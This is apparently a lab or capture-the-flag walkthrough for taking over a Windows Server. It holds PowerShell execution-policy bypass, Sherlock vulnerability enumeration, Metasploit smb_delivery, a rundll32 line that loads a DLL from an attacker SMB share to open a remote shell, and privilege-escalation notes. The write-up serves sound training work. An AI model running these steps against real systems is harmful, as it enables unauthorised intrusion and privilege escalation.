# [Windows Server](Windows%20Server.md)
### Obtain a shell on the target host, enumerate the system and escalate privileges. Submit the contents of the flag.txt file on the Administrator Desktop.

```powershell
Set-ExecutionPolicy bypass -Scope process
```
![](Screenshot%202026-08-26%20at%2008.14.02.png)

```powershell
Import-Module .\Sherlock.ps1
Find-AllVulns
```
![](Screenshot%202026-08-26%20at%2008.19.33.png)

```shell
search smb_delivery

use 0
```
![](Screenshot%202026-08-26%20at%2008.20.26.png)
![](Screenshot%202026-08-26%20at%2008.21.54.png)

```cmd
rundll32.exe \\10.10.14.235\LdcQ\test.dll,0
```
![](Screenshot%202026-08-26%20at%2008.33.30.png)
![](Screenshot%202026-08-26%20at%2008.37.58.png)

Press `ctrl+z` to background session
![](Screenshot%202026-08-26%20at%2008.39.48.png)

Before escalate privilege I have to migrate x86 -> x64
![](Screenshot%202026-08-26%20at%2008.46.49.png)

Remember `Set ForceExploit true` 
![](Screenshot%202026-08-26%20at%2009.36.10.png)
![](Screenshot%202026-08-26%20at%2009.35.41.png)